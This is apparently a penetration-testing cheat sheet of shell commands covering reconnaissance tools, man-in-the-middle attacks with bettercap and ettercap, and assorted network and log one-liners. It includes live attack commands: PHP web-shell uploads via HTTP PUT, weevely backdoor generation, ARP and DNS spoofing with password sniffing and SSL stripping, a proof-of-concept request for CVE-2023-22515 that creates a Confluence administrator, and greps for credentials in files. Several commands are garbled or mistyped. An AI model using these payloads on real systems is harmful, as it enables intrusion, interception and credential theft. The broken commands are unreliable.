curl -u username --silent "https://mail.google.com/mail/feed/atom" | awk 'BEGIN{FS="\n";RS="(</entry>\n)?<entry>"}NR!=1{print "\033[1;31m"$9"\033[0;32m ("$10")\033[0m:\t\033[1;33m"$2"\033[0m"}' | sed -e 's,<[^>]*>,,g' | column -t -s $'\t'


## ---------------------------------------------- ##
##   [+] Curl - Fetch an email from GMail:
## ---------------------------------------------- ##
curl -n --ssl-reqd --mail-from "<user@gmail.com>" --mail-rcpt "<user@server.tld>" --url smtps://smtp.gmail.com:465 -T file.txt





##-==============================================-##
##   [+] Curl - Check for title and all links
##-==============================================-##
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'


##-============================================-##
##   [+] Curl - Look at page with just text
##-============================================-##
curl $IP -s -L | html2text -width '99' | uniq


##-=======================================================-##
##   [+] Curl -  Get Options available from web server
##-=======================================================-##
curl -vX OPTIONS http://$IP/


##-===================================================-##
##   [+] Curl -  Check if it is possible to upload
##-===================================================-##
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php



##-===================================================-##
##   [+] Curl -  upload a file using the PUT method
##-===================================================-##
curl -T 'leetshellz.txt' 'http://$IP'
        

##-=======================================================================-##
##   [+] Curl - rename it to an executable file using the MOVE method:
##-=======================================================================-##
curl -X MOVE --header 'Destination:http://$IP/leetshellz.php' 'http://$IP/leetshellz.txt'




##-========================================================-##
##   [+] Curl - Web Header Manipulation - Send Fake IP:
##-========================================================-##

curl --header "X-Forwarded-For: 192.168.1.1" http://$TARGET



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] bbot - Enum + Recon + API - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-========================================================-##
##   [+] bbot - Perform Full Subdomain Enumeration
##-========================================================-##
bbot -t $Domain -f subdomain-enum 


##-=============================================================-##
##   [+] bbot - Perform Web Scan - wappalyzer, robots.txt, etc
##-=============================================================-##
bbot -t $Domain -f subdomain-enum web-basic


##-========================================================-##
##   [+] bbot - Perform Passive Subdomain Enumeration 
##-========================================================-##
bbot -t $Domain -f subdomain-enum -rf passive


##-========================================================-##
##   [+] bbot - Web Spider - 
##-========================================================-##
bbot -t $Domain -m httpx robots badsecrets -c web_spider_distance=2 web_spider_depth=1


##-========================================================-##
##   [+] bbot - 
##-========================================================-##
bbot -t $Domain -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deatdly




## ------------------------------------------------------------------ ##
##      [?]  Port-scan every subdomain
##      [?]  screenshot every webpage
##      [?]  output to current directory
## ------------------------------------------------------------------ ##
bbot -t $Domain -f subdomain-enum -m nmap gowitness -n my_scan -o .


##-=========≈=≈=================================-##
##    [+] bbot - Subdomains + basic web scan:
##-=========≈=≈=================================-##
## ------------------------------------------------------------------ ##
##      [?]  includes wappalyzer, robots.txt,
##      [?]  and other non-intrusive web modules
## ------------------------------------------------------------------ ##
bbot -t $Domain -f subdomain-enum web-basic


##-============================-##
##    [+] bbot - Web spider:
##-============================-##
## ------------------------------------------------------------------ ##
##   [?] Crawl $Domain
##   [?] max depth of 2 
##   [?] auto extract emails, secrets, etc.
## ------------------------------------------------------------------ ##
bbot -t $Domain -m httpx robots badsecrets secretsdb -c web_spider_distance=2 web_spider_depth=2


##-====================================================-##
##     [+] bbot - Everything everywhere all at once:
##-====================================================-##
## ------------------------------------------------------------------ ##
##     [?]  Subdomains, emails, web scan,
##     [?]  cloud buckets, port scan, 
##     [?]  web screenshots, nuclei
## ------------------------------------------------------------------ ##
bbot -t  $Domain -f subdomain-enum email-enum cloud-enum web-basic -m nmap gowitness nuclei --allow-deadly




~/.config/bbot/secrets.yml





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SpiderFoot - Enum + Recon + API - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


python3 /usr/share/sniper/bin/
github-subdomains.py -t $GITHUB_API_TOKEN -d $TARGET 
$DIR/domains/domains-$TARGET-github.txt






*************************************************************
 Use SpiderFoot by starting your web browser of choice and 
 browse to http://127.0.0.1:8099
*************************************************************



spiderfoot -l 127.0.0.1:8099
http://127.0.0.1:8099





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Recon-ng - Enum + Recon + API - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##   [+] Show API keys 

[recon-ng][default] > keys list



use recon/domains-contacts/whois_pocs
run

[recon-ng][default] > keys add bing_api $Key
[*] Key 'bing_api' added.

use recon/domains-hosts/bing_domain_api
run
use recon/domains-hosts/bing_domain_web
run
use recon/domains-hosts/builtwith
run

use recon/domains-hosts/hackertarget
run
use recon/domains-hosts/netcraft
run



Add the Shodan API key:
keys add shodan_api $Key


use recon/hosts-ports/shodan_ip
run
use recon/domains-hosts/shodan_hostname
run


use recon/contacts-profiles/fullcontact
run



use recon/netblocks-companies/whois_orgs
run
use recon/netblocks-hosts/shodan_net
run
use recon/netblocks-ports/censysio
run


keys add ipinfodb_api $Key
[recon-ng][TM][interesting_files] > use recon/hosts-hosts/ipinfodb
[recon-ng][TM][ipinfodb] > run

use recon/hosts-hosts/ipinfodb
run


[recon-ng][interesting_files] > load recon/contacts-social/twitter
[recon-ng][twitter] > keys add twitter_api $Key
[*] Key 'twitter_api' added.
[recon-ng][twitter] > keys add twitter_secret $Key
[*] Key 'twitter_secret' added.

[recon-ng][default][twitter] > run




use recon/hosts-hosts/ssltools
run


use recon/domains-hosts/brute_hosts >> $domain$stamp.resource
echo "set WORDLIST /usr/share/recon-ng/data/sorted_knock_dnsrecon_fierce_recon-ng.txt" >> $domain$stamp.resource
echo "set SOURCE $domain" >> $domain$stamp.resource
echo "run" >> $domain$stamp.resource


echo "use recon/netblocks-companies/whois_orgs" >> $domain$stamp.resource
echo "set SOURCE $domain" >> $domain$stamp.resource
echo "run"



## Add the target domain
> add domains $Domain

workspaces add $Domain
workspaces select $Domain

## Double check if domain is added
> show domains

## check added hosts
> show hosts



[recon-ng][$Domain] > show ports

[recon-ng][$Domain] > show hosts

[recon-ng][$Domain] > show contacts

show modules


> load geocode
> use recon/locations-locations/geocode

> show options
> show info
> set SOURCE query SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL
> run


## Check locations
> show locations

## Now reverse
> load reverse
> use recon/locations-locations/reverse_geocode
> run




show modules
use recon/domains-vulnerabilities/punkspider

Show module
use recon/domains-vulnerabilities/xssed
Show Options
Set source Microsoft.com
Show Options
RUN









use	recon/contacts/gather/http/api/whois_pocs
[recon‐ng][default][whois_pocs] > show options
[recon-­ng][default][whois_pocs] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][recon-­ng][default][whois_pocs] > run

use recon/hosts/enum/http/web/xssed
[recon‐ng][xssed] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][xssed] > run

[recon‐ng]> use recon/hosts/gather/http/web/google_site
[recon‐ng][google_site] > set DOMAIN cisco.com
DOMAIN => cisco.com
[recon‐ng][google_site] > run

[recon‐ng]> use recon/hosts/gather/http/web/ip_neighbor
[recon‐ng][ip_neighbor] > set SOURCE cisco.com
SOURCE => cisco.com
[recon‐ng][ip_neighbor] > run




testssl.sh --add-ca companyCA1.pem,companyCA2.pem ADDTL_CA_FILES=companyCA1.pem,companyCA2.pem 

testssl.sh 


keytool -list -rfc -keystore lib/security/cacerts | grep -E -v '^$|^\*\*\*\*\*|^Entry |^Creation |^Alias '


##-============================================================-##
##   [+] pull all certificates from Windows Update services:
##-============================================================-##
CertUtil -syncWithWU -f -f


http://aka.ms/RootCertDownload
https://technet.microsoft.com/en-us/library/dn265983(v=ws.11).aspx#BKMK_CertUtilOptions). 



## ------------------------------------------ ##
##   [?] They are in DER format
##   [?] Convert them using the following:
## ------------------------------------------ ##
for f in *.cer; do echo $File >/dev/stderr; openssl x509 -in $File -inform DER -outform PEM ;done >/tmp/Microsoft.pem




##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##          [+] Bettercap - MITM - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-=================================================================-##
##   [+] Bettercap - MITM Framework - Swiss Army Knife for 802.11
##-=================================================================-##
bettercap -iface eth0 -X --proxy -O $File.log

bettercap -iface eth0 -caplet $File.cap



##-===========================-##
##   [+] Bettercap - WebUI 
##-===========================-##
bettercap -caplet http-ui

bettercap -caplet https-ui -iface eth0





bettercap -eval "set arp.spoof.targets $IP; arp.spoof on"



## ----------------------------------------------------- ##
##   [?] Bettercap - DNS Spoof Module - DNS Spoofing
## ----------------------------------------------------- ##
dns.spoof on
set dns.spoof.domains
set dns.spoof.address 
set dns.spoof.all true


## ------------------------------------------------------------ ##
##   [?] Bettercap - Net Sniff Module - Full Traffic Capture
## ------------------------------------------------------------ ##
net.sniff on
set net.sniff.local true
set net.sniff.verbose 'true'
set net.sniff.output 'capture.pcap'




## --------------------------------------------------------- ##
##   [?] Bettercap - Net Sniff Module - Password Sniffing
## --------------------------------------------------------- ##
net.sniff on
set net.sniff.local true
set net.sniff.verbose 'true'
set net.sniff.regexp '.*password=.+'
set net.sniff.output 'passwords.pcap'




## --------------------------------------------------------- ##
##   [?] Bettercap - HTTPS Proxy
## --------------------------------------------------------- ##
arp.spoof on
http.proxy on
set net.sniff.verbose 'true'
set https.proxy.sslstrip true
set arp.spoof.targets $IP
hstshiack/hstshijack
net.sniff on




bettercap -eval "help net.recon; q"





##  [+] ARP Cache Poisoning
arpspoof -t <ip victime> <ip gateway> -r
arpspoof -i <interface (eth0)> <ip gateway>


##  [+] Bettercap (ARP Cache Poisoning)
bettercap -X --proxy -O bettercap.log







##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##          [+] Ettercap - MITM - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




etterfilter $rrr -o filter.ef


ettercap -T -Q -i $interface -F $find2/$filname -M arp /$rou/ /$targ/


ettercap -T -Q -i $interface -P find_ip -M arp // // | grep "find_ip:" | awk '{print}'


ettercap -T -Q -i $interface -P dos_attack -M arp // //


sslstrip.py -p -w ~/opensource/logs/$SESSION.log -l 10000 &


ettercap -T -q -i $interface -w ~/opensource/logs/$SESSION.pcap -L ~/opensource/logs/$SESSION -M arp /$ROUTER/ /$VICTIM/


ettercap -T -Q -i $interface -P remote_browser -M arp /$rou/ /$targ/


##-========================================================-##
##   [+] Ettercap - DNS SPOOFING {redirect web-domains}
##-========================================================-##
ettercap -T -Q -i $interface -P dns_spoof -M arp /$rou/ /$targ/


##-=================================================================-##
##   [+] Ettercap - LocalNet MITM Attack - Capture TCP/IP Packets
##-=================================================================-##
ettercap -T -Q -i $interface -M arp /$TargetIP/ /$GatewayIP/


##-======================================================-##
##   [+] Ettercap - Sniff Pictures on Remote Machine:
##-======================================================-##
driftnet -i $interface -d ~/opensource/netool-capture & ettercap -T -Q -i $interface -M arp /$targ/ /$rou/



##-=============================================-##
##   [+] Ettercap - 
##-=============================================-##
ettercap -T -M arp -V [hex,ascii] /x.x.x.x/ /x.x.x.x/
ettercap -T -P repoision_arp -M arp:remote /10.10.102.50/ /10.10.102.5/

ettercap -Tq -M arp:remote -P remote_browser (-P repoison arp) /10.10.102.100/ /10.10.102.4,5/


##-====================================-##
##   [+] MITM IPv6 Report Parasite6
##-====================================-##
ettercap -Tq -w fichero -M ndp:oneway //fe80:xxxxx? //fe80:xxxxx/

fake_router6 eth0 1::/64


##-=============================================-##
##   [+] Ettercap - 
##-=============================================-##
etterfilter filtro.filter -i filtro.ef
ettercap -Tq -F ./filtro.ef -M arp_remote -P repoision_arp /10.10.102.60/ 10/10/10




Starting attack on Gateway


echo "1" > /proc/sys/net/ipv4/ip_forward 
#  PORT redirection
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000


# URLSnarf
urlsnarf-$(date +%F-%H%M).txt -e urlsnarf  -i $ETH0 &
sleep 2

# Ettercap
ettercap$(date +%F-%H-%M).txt -e ettercap -Tq -i $ETH0 -M arp:remote /$GATEWAY/ // &
sleep 2

# SSLstrip
sslstrip -f -p -k 10000 &
sleep 2

# SSLstrip.log cat the file sslstrip.log
sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log &








PID=`ps -ef | grep -v grep | grep -v xterm | grep -i "ettercap" 
if [[ "$PID" && "$PID" == "$Ettercap_PID" ]]; then
    kill -9 $Ettercap_PID >/dev/null 2>&1
fi



echo -e "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Ettercap Dump ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" >> $Final_Log


etterlog -p $Ettercap_Passive_Log >> $Final_Log 2>&1




#  DHCP
echo "              Setting up DHCP to work with $ESSID...."
touch /var/run/dhcpd.pid
chown dhcpd:dhcpd /var/run/dhcpd.pid
dhcpd3 -d -f -cf "/var/run/dhcpd/dhcpd.conf" at0 & dhcpid=$!



# SSLstrip
echo "            Starting SSLstrip to enumerate user credentials...."
sslstrip -e sslstrip -f -p -k 10000 & sslstripid=$!



# URLSnarf
echo " Starting URLSnarf to show the websites the victim browses...."
urlsnarf-$(date +%F-%H%M).txt -e urlsnarf -i $internet_interface & urlsnarfid=$!





cat /root/$SESSION/sslstrip$(date +%F-%H-%M).txt -e tail -f sslstrip.log & sslstriplogid=$!










##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##          [+] Cookie Stealing - MITM - Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


## ------------------------------------------------ ##
##   [?] Cookie Stealing:
## ------------------------------------------------ ##


##-===============================-##
##   [+] Save Cookies To A File
##-===============================-##
curl -c cookies.txt $Domain


##-=================================-##
##   [+] Load Cookies from a File
##-=================================-##
curl -b cookies.txt $Domain


##-=================================-##
##   [+] WGet - Capture Session Token:
##-=================================-##
wget -q --save-cookies=$Cookie.txt --keep-session-cookies --post-data="username:admin&password=pass&Login=Login" http://$URL/login.php


##-============================-##
##   [+] Curl - POST File
##-============================-##
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"


##-=============================================-##
##   [+] Curl - POST Binary Data to Web Form
##-=============================================-##
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v


##-========================================================-##
##   [+] Curl - PUTing File on the Webhost via PUT verb
##-========================================================-##
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php











##-================================-##
##   [+] 
##-================================-##
sslstrip -w sslstrip.log -l 8080


##-================================-##
##   [+] Monitor all TCP ports:
##-================================-##
urlsnarf -i eth0 tcp


##-================================-##
##   [+] Monitor on TCP $Port:
##-================================-##
urlsnarf tcp port $Port





##-=================================================================-##
##   [+] Socat - Listen on 1234 and Forward To Port 80 on 2.2.2.2
##-=================================================================-##
socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80








##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   [+] Regex - XArgs + Cut + Grep + Awk - Txt Manipulation
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-===========================================-##
##   [+] Bulk Download Files By Their URLs
##-===========================================-##
## ------------------------------------------------ ##
##   [?] The URL Links Are Fed To Curl From xarg
## ------------------------------------------------ ##
xargs -n 1 curl -O < $File


##-=================================================-##
##   [+] Recursively fetch list of URLs with wget:
##-=================================================-##
cat $URLList.txt | xargs wget ???c


## ------------------------------------------ ##
##   [?] Pipe an IP address list into NMap
## ------------------------------------------ ##
cat $IPList.txt | xargs -n1 nmap -sV




##-======================-##
##    [+]  :
##-======================-##
xargs -a .tmp/domains -P 50 -I % bash -c "assetfinder --subs-only % | anew -q .tmp/seconddomains.list" 2> /dev/null


##-======================-##
##    [+]  :
##-======================-##
xargs -a .tmp/domains -P 10 -I % bash -c "amass enum -passive -d %" 2> /dev/null | anew -q .tmp/seconddomains.list



##-======================-##
##    [+]  :
##-======================-##
xargs -a database/alive.txt -P 50 -I % bash -c "echo % | aquatone -chrome-path $CHROME_BIN -out database/screenshots/ -threads 10 -silent" 2> /dev/null &> /dev/null


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | waybackurls" 2> /dev/null | anew -q .tmp/waybackurls.list


##-========================-##
##     [+] 
##-========================-##
xargs -a database/lives.txt -P 50 -I % bash -c "echo % | gau --blacklist eot,jpg,jpeg,gif,css,tif,tiff,png,ttf,otf,woff,woff2,ico,svg,txt --retries 3 --threads 50" 2> /dev/null | anew -q .tmp/gau.list 2> /dev/null &> /dev/null



##-===================================================-##
##    [+] Grep - Regex to search for sensitive info 
##-===================================================-##
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp|GTM-" *.js





##-======================================================-##
##   [+] Grep emails and other PII Data from URLs file
##-======================================================-##
grep -E -o '\\\\\\\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\\\\\.[a-zA-Z]{2,}\\\\\\\\b' urls.txt


##-==========================================-##
##   [+] Extract Endpoints from JavaScript
##-==========================================-##
cat FILE.js | grep -oh "\\\\\\\\"\\\\\\\\/[a-zA-Z0-9_/?=&]&\\\\\\\\""| sed -e 's/^"//' -e 's/"$//' | sort -u


##-==================================-##
##   [+] katana - Collect JS Files
##-==================================-##
katana -list targets.txt -jc | grep “\\.js$” | uniq | sort -u | tee JS.txt


##-========================-##
##   [+] gau - 
##-========================-##
cat targets.txt | gau |  grep “\\.js$” | uniq | sort -u | tee JS2.txt


##-=====================================-##
##   [+] nuclei - Analyzing JS files
##-=====================================-##
nuclei -l JS.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt










##-==========================================================-##
##   [+] Local File Priv Escalation - Wildcard Searching:
##-==========================================================-##
## ---------------------------------------------------------- ##
##   [?] find useful things hidden deep in the file system
## ---------------------------------------------------------- ##
ls /*/*/*/*.conf



find / -type f -name '*.conf' | xargs grep -rnw -3 "Password" 2>/dev/null





##-===============================================================-##
##   [+] Download all recently uploaded pastes on pastebin.com
##-===============================================================-##
elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget



##-===============================================================-##
##   [+] Download all recently uploaded pastes on pastebin.com
##-===============================================================-##
elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget




tcpdump -i ethO -c 50 -tttt 'udp and port 53'


echo "##-==================================-##"
echo " 	  [+] Capture DNS Exfil Packets		"
echo "##-==================================-##"
tcdpump -w /tmp/dns -sO port 53 and host $Domain


##-================================================-##
##   [+] Cut the exfiled hex from the DNS packet
##-================================================-##
tcpdump -r dnsdemo -n | grep $Domain | cut -f9 -d | cut -fl -d'.' | uniq received. txt



##-=======================================================-##
##   [+] Host - Use bash loop to find IPs for each host:
##-=======================================================-##
for url in $(cat list.txt); do host $url; done


## ----------------------------------------------------------- ##
##   [+] Collect all the IPs from log and sort by frequency
## ----------------------------------------------------------- ##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn




##-===============================================================-##
##   [+] Find the ISPs of everyone who logged into your server
##-===============================================================-##
grep -o -E "Accepted publickey for .*" /var/log/auth.log | awk '{print $6}' | xargs -n1 whois | grep org-name



##-================================================================-##
##   [+] List the number and type of active network connections
##-================================================================-##
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c



##-=====================================================-##
##   [+] Monitor open connections for httpd
##   [+] including listen, count and sort it per IP
##-=====================================================-##
watch "netstat -plan|grep :80|awk {'print \$5'} | cut -d: -f 1 | sort | uniq -c | sort -nk 1"

grep -i segfault /var/log/*							##  check for buffer overflows in logs
grep -i auth /var/log/* |grep -i failed				##  check authentication failed tries


##-==============================================================-##
##   [+] Show apps that use internet connection at the moment
##-==============================================================-##
lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2



##-=====================================================================-##
##   [+] View network activity of any application or user in realtime
##-=====================================================================-##
lsof -r 2 -p $PID -i -a



##-=============================================-##
##   [+] # Show current listening connections:
##-=============================================-##
lsof -Pni4 | grep LISTEN
lsof -nP -i TCP -s TCP:LISTEN
lsof -nP -i | awk '/LISTEN/ {print $2 " " $7 " " $8}'


##-===========================-##
##   [+] Check Connections
##-===========================-##
lsof -i | awk '{print $8}' | sort | uniq -c | grep 'TCP\|UDP'


##-===========================-##
##   [+] Check Established
##-===========================-##
lsof -i | grep ESTABLISHED
lsof -i -nP | grep ESTABLISHED | awk '{print $1, $9}' | sort -u


##-=======================-##
##   [+] Check Active
##-=======================-##
lsof -nP -iTCP -sTCP:ESTABLISHED | grep HTTPS


##-=======================-##
##   [+] Check LISTEN
##-=======================-##
lsof -i | grep LISTEN


##-======================================-##
##   [+] List all files opened by DHCP
##-======================================-##
lsof -c dhcpd



##-================================================-##
##   [+] use awk to parse the output of:
##       > Process name, PID, and process owner
##-================================================-##
lsof -nPi | awk '/LISTEN/ {print $1, $2, $3, $8, $9}'

lsof -i -nlP | awk '{print $1, $8, $9}' | sort -u
lsof -i -nlP | awk '{print $9, $8, $1}' | sed 's/.*://' | sort -u








Search Diggity
ShodanHQ
PassiveRecon
EDGAR
theHarvester
gxfr.py
VisualRoute






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] metagoofil - OSINT Metadata Info Gathering Tool
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



##-================================================================-##
##   [+] Extract public pdf, doc, and ppt files from $Domain
##-================================================================-##
## ---------------------------------------------------------------- ##
##   [?] (limited to 200 searches and 5 downloads)
## ---------------------------------------------------------------- ##
##   [?] save the downloads to "/root/Desktop/metagoofil/"
##   [?] output results to "/root/Desktop/metagoofil/result.html"
## ---------------------------------------------------------------- ##
##-================================================================-##
metagoofil -d $Domain -t pdf,doc,ppt -l 200 -n 5 -o /$Dir/ -f /$Dir/$File.html



## ---------------------------------------------------------------------- ##
##    [?] Scan for PDFs (-t pdf) with specified $Domain (-d kali.org)
## ---------------------------------------------------------------------- ##
##    [?] searching 100 results (-l 100)
## ---------------------------------------------------------------------- ##
##    [?] download 25 files (-n 25)
## ---------------------------------------------------------------------- ##
##    [?] saving the downloads to a directory (-o kalipdf)
## ---------------------------------------------------------------------- ##
##    [?] saving the output to a file (-f kalipdf.html)
## ---------------------------------------------------------------------- ##
metagoofil -d $Domain.org -t pdf -l 100 -n 25 -o /$Dir/ -f $File.html


metagoofil -d $Domain -t pdf -l 200 -o /$Dir/ -f $File.html

metagoofil.py -d $Domain -t doc,pdf -l 200 -n 50 -o /$Dir/ -f $File.html
metagoofil.py -h yes -o /$Dir/ -f $File.html



metagoofil -d $Target -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $Dir/ -f $Dir/$Target.html 2> /dev/null | tee $Dir/metagoofil-$Target.txt 2> /dev/null



metagoofil.py -d $Target -t doc,pdf,xls,csv,txt -l 25 -n 25 -o $Dir/ -f $Dir/$Target.html 2> /dev/null | tee $Dir/metagoofil-$Target.txt



##-============================================================-##
##   [+] Perform document metadata searching on target domain 
##       using first 200 google results
##-============================================================-##
metagoofil -d $Domain -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html


##-====================================-##
##   [+] Metagoofil - User Manual:
##-====================================-##
zcat /usr/share/doc/metagoofil/README.md.gz | less


##-==============================================-##
##   [+] GooRecon - find subdomains available:
##-==============================================-##
goorecon -s $Domain


##-====================================================-##
##   [+] GooRecon - Find email addresses for Domain:
##-====================================================-##
goorecon -e $Domain



##-==============================================-##
##   [+] GooFile - 
##-==============================================-##
goofile -d $Domain -f pdf
goofile -d $Domain -f doc
goofile -d $Domain -f docx
goofile -d $Domain -f pdf          
goofile -d $Domain -f ppt
goofile -d $Domain -f pptx
goofile -d $Domain -f txt          
goofile -d $Domain -f xls
goofile -d $Domain -f xlsx




##-==============================================-##
##   [+] Automater - 
##-==============================================-##
automater -s robtex $IP



##-==============================================-##
##   [+] Phoneinfoga - Search a Phone Number
##-==============================================-##
phoneinfoga.py -n 1717-9539 --recon




enumiax
fping
hping3
medusa
mitmproxy
nasm
oscanner
p0f
powersploit
pwnat
crackmapexec
sbd
sfuzz
siege
skipfish
t50
webacoo

webshells
websploit
weevely


##-===========================================-##
##   [+] weevely - Generate a PHP backdoor
##-===========================================-##
weevely generate s3cr3t  
weevely http://$IP/weevely.php s3cr3t


## -------------------------------------------------------------------- ##
##   [?] Web Shag Web Application Vulnerability Assessment Platform  
## -------------------------------------------------------------------- ##
webshag-gui




etherwake

wpscan

xprobe

xsser
beef-xss

hexinject

cloud-enum

azure-cli

godoh
s3scanner
s3backer
node-aws4
awscli
cloudbrute
impacket-scripts
iodine

joomscan
laudanum



sherlock

swaks

ismtp
python3-shodan
emailharvester
instaloader
inspy




afl
doona
dhcpig 
enumiax
gvm
inviteflood

dnschef
dsniff
driftnet
bettercap
dnscap

## --------------------------------------------------------------------------------------- ##
##   [?] Unbound - a recursive-only caching DNS server that performs DNSSEC validation
## --------------------------------------------------------------------------------------- ##

## ------------------------------------------------------------------ ##
##   [?] dnsjit - Engine for capturing, parsing and replaying DNS 
## ------------------------------------------------------------------ ##
## 
## -------------------------------------------------------------------- ##
##   [?] drool - replay DNS traffic from packet capture (PCAP) files 
## -------------------------------------------------------------------- ##
## 
## --------------------------------------------------------------------------------- ##
##   [?] Dothost  - A DNS lookup network utility that outputs in Graphviz format
## --------------------------------------------------------------------------------- ##
## 
## ------------------------------------------------ ##
##   [?] dnsperf - DNS Performance Testing Tool
## ------------------------------------------------ ##
## 
## ------------------------------------------------------------ ##
##   [?] fever - event router for Suricatas EVE-JSON format
## ------------------------------------------------------------ ##
## 
## ----------------------------------------------------------------------------- ##
##   [?] lexicon - CLI for manipulating DNS records on various DNS providers
## ----------------------------------------------------------------------------- ##



sniffjoke
fiked
hamster-sidejack
isr-evilgrade
mitmproxy
rebind
responder
sslsniff
sslsplit
wifi-honey


## -------------------------------------------- ##
##   [?] O-Saft - SSL advanced forensic tool
## -------------------------------------------- ##

## -------------------------------------------------------------- ##
##   [?] Ghidra - software reverse engineering (SRE) framework 
## -------------------------------------------------------------- ##
airgeddon
bully


fern-wifi-cracker
hackrf
pixiewps
reaver





##-====================================================-##
##   [+] Reaver - 
##-====================================================-##
reaver -a -S -vv -c $Channel -i mon0 -b $MAC -d $Delay





##-======================================-##
##   [+] 0x07 KRACK PoC Demonstration
##-======================================-##
git clone https://github.com/Hackndo/krack-poc.git


##-=======================================-##
##   [+] KRACK PoC - Start krack attack 
##-=======================================-##
sudo python krack-ft-test.py wpa_supplicant -D nl80211 -i wlan1 -c wifi.conf


##-==========================-##
##   [+] Generate Traffic
##-==========================-##
arping -i wlan1 192.168.1.254




##-================================-##
##   [+] PoC for CVE-2023-22515: 
##-================================-##
curl -k -X POST -H "X-Atlassian-Token: no-check" --data-raw "username=adm1n&fullName=admin&email=admin@confluence&password=adm1n&confirm=adm1n&setup-next-button=Next" http://confluence/setup/setupadministrator.action 

## ----------------------------------------------------------- ##
##    [?] login with adm1n/adm1n)
## ----------------------------------------------------------- ##



##-====================================================-##
##   [+] Authentication Bypass (CVE-2022-40684) POC
##-====================================================-##
## --------------------------------------------------------------------------- ##
##    [?] https://twitter.com/h4x0r_dz/status/1580648642750296064/photo/1>
## --------------------------------------------------------------------------- ##
